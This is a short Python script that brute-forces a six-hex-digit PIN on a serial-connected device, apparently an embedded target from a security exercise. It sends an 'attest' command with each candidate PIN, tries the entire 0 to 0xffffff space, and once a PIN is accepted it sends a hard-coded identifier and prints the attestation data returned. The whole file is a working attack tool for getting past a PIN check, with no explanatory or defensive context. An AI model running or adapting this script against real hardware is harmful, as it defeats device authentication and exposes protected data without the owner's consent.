import serial

PORT = "/dev/ttyACM0"
START = 0
PRINT_FREQ = 1000


def get_pin():
    ser = serial.Serial(
        port=PORT,
        baudrate=115200,
        parity=serial.PARITY_NONE,
        stopbits=serial.STOPBITS_ONE,
        bytesize=serial.EIGHTBITS,
    )

    for i in range(START, 0xffffff):
        pin = hex(i)[2:].zfill(6)

        ser.write(b"attest\r")
        ser.read_until(b"%ack%").decode()

        ser.write(f"{pin}\r".encode())
        output = ser.read_until(b"%ack%").decode()

        if "Invalid PIN" in output:
            if i % PRINT_FREQ == 0:
                print(pin, ":", output)
        elif "Pin Accepted" in output:
            print(pin, "valid!")
            print("output:", output)

            ser.write(b"cb9d6f46\r")
            data = ser.read_until(b"%ack%").decode()
            print("read:", data)

            return
        else:
            print(output)


if __name__ == "__main__":
    get_pin()
